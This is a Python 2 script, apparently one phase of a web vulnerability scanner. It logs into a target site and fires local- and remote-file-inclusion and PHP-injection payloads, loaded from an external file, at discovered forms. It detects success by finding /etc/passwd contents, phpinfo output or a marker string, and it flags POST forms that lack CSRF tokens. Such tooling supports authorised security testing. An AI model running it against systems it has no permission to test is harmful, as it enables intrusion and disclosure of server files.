__author__ = 'Sun Fei'

import json
import requests
import parameter
import config
import copy
from loginform import fill_login_form
from form import Form
from pprint import pprint
from urllib import urlencode

negKeywords = config.negKeywords

def checkStringContainKey(testString,keyWords):
    for word in negKeywords:

        if word in testString:
            return True
    return False

#pprint(checkStringContainKey(testString,negKeywords))
pprint("reading output from phase1")
with open('../output/phase1_output.json') as data_file:
    data = json.load(data_file)

    pprint("start processing phase3")
    client = requests.Session()
    start_urls = parameter.login_urls
    login_user = parameter.username
    login_pass = parameter.password
    login_flag = parameter.login

    response = client.get(start_urls[0],verify=False)
    if login_flag == False:
        loginResponse = client.get(start_urls[0],verify=False)
    else:        
        args, url, method = fill_login_form(response.url, response.content, login_user, login_pass)
        loginResponse = client.post(url, data=args, headers=dict(Referer=start_urls))
    
    pprint(loginResponse)
    jsonform = []
    if "Invalid" in response.content:
        pprint("Login failed")
    else: 
        pprint("login successful")
        print data
        for formDetails in data:
            url = formDetails["url"]
            action = formDetails["action"]
            if checkStringContainKey(action,negKeywords)==False:#check the Negative keywords to filter out non-sensitive data
                if formDetails["method"].lower() == "get":# form is a get form, it cannot                 

                    #load possible exploit payloads(may generate from phase2)
                    with open('evaluation.json') as evaluates:
                        evalData = json.load(evaluates)
                        for item in evalData:
                            ssciForm = Form(url, formDetails)
                            valid_parameters = dict(ssciForm.fill_entries(payload=evalData[item]))
                            print 'parameters!!!'
                            print valid_parameters
                            # try:
                            r = client.get(action, params=urlencode(valid_parameters))
                            if r != None:
                                if r.status_code == 200:
                                    # print r.content
                                    # print r.url
                                    injectSuccess = False
                                    if item == 'LFI1':
                                        if "root:x:0:0:root:/root:/bin/bash" in r.content:
                                            print "injection success1!"
                                            injectSuccess = True
                                    elif item == 'LFI2' or item == 'LFI3' or item == 'LFI4':
                                        if "PHP Version" in r.content:
                                            print "injection success2!"
                                            print 'LFI, show phpinfo'
                                            injectSuccess = True
                                            # print r.content
                                    elif item == 'RFI1' or item == 'RFI2' or item == 'RFI3':
                                        print 'RFI, show phpinfo'
                                        if "PHP Version" in r.content:
                                            print "injection success3!"
                                            print 'RFI, show phpinfo'
                                            injectSuccess = True
                                    elif item == 'PHP1' or item == 'PHP2':
                                        print 'PHP, show phpinfo'
                                        if "PHP Version" in r.content:
                                            print "injection success4!"
                                            print 'PHP, show phpinfo'
                                            injectSuccess = True
                                    elif item == 'PHP3' or item == 'PHP4':
                                        print 'PHP, show special string'
                                        if "pawned" in r.content:
                                            print "injection success5!"
                                            print 'PHP, show special string'
                                            injectSuccess = True
                                    #formDetails["url"] = url
                                    if injectSuccess == True:
                                        confirmForm = copy.deepcopy(formDetails)
                                        confirmForm["parameter"] = copy.deepcopy(valid_parameters)
                                        # formDetails["parameter"] = valid_parameters
                                        if len(valid_parameters) != 0:
                                            jsonform.append(confirmForm)
                                    #pprint("post form "+ssciForm.formdata["action"] +  " is vulnerable to CSRF")
                                else:
                                    print "status code", r.status_code

                            continue
                            # except :
                            #     ''

                elif formDetails["method"].lower() == "post":# form is a post form, check for CSRF
                    ssciForm = Form(url,formDetails)
                    #we send a request with randomly filled in token
                    valid_parameters = dict(ssciForm.fill_entries())

                    try:
                        r = client.post(action,valid_parameters)
                        if r != None:#sometimes the request can not be processed
                            pprint(r.content)
                            if r.status_code == 200:#  reponse 200 means the CSRF is successful
                                formDetails["parameter"] = valid_parameters
                                if len(valid_parameters) != 0:
                                    csrfTemp = False
                                    for temp in valid_parameters:
                                        if temp.lower().find("csrf") > -1 or temp.lower().find("token")>-1:
                                            csrfTemp = True
                                    if csrfTemp == False :
                                        jsonform.append(formDetails)
                        continue
                    except :
                        ''
                        #pprint('response is null')
with open("../output/phase3_output.json",'w') as outfile:
    json.dump(jsonform,outfile, indent=2)
